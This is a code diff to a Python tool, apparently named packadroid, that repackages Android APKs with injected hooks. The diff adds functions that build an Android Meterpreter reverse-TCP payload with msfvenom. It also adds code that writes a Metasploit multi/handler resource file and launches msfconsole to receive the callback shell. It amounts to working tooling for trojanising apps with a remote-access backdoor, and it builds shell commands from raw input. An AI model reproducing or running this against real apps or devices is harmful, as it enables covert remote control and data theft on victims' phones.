@@ -1,5 +1,7 @@
 import shutil
 import os
+import subprocess
+import sys
 
 from packadroid.apkhandling import packer
 from packadroid.hookmanager import activity_hook
@@ -44,10 +46,32 @@ class PackadroidSession():
             payload_dec_path = same_apk[0].get_payload_dec_path()
         self.__hooks.append(hook.Hook(t, location, class_name, method_name, payload_apk_path, payload_dec_path))
 
-
     def load_activities(self, manifest_path):
         activities = manifest_analyzer.find_all_activities(manifest_path)
         self.__activities.append(activities)
+
+    def generate_meterpreter(self, ip, lport):
+        """ executes meterpreter with the options given"""
+        command = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + lport + " -o meterpreter.apk"
+        proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+        (out, err) = proc.communicate()
+
+        if "invalid" in out.lower() or \
+                "error" in out.lower():
+            print(out)
+            sys.exit(1)
+
+    def start_meterpreter_handler(self, ip, lport):
+        with open("meterpreter_options.txt", "w") as f:
+            f.write("use exploit/multi/handler\n")
+            f.write("set payload android/meterpreter/reverse_tcp\n")
+            f.write("set lhost " + ip + "\n")
+            f.write("set lport " + lport + "\n")
+            f.write("exploit\n")
+    
+        command = "msfconsole -r meterpreter_options.txt"
+        proc = subprocess.Popen(command, shell=True)
+        (out, err) = proc.communicate()
 
     def repack(self, output=None):
         if not self.is_original_apk_loaded():
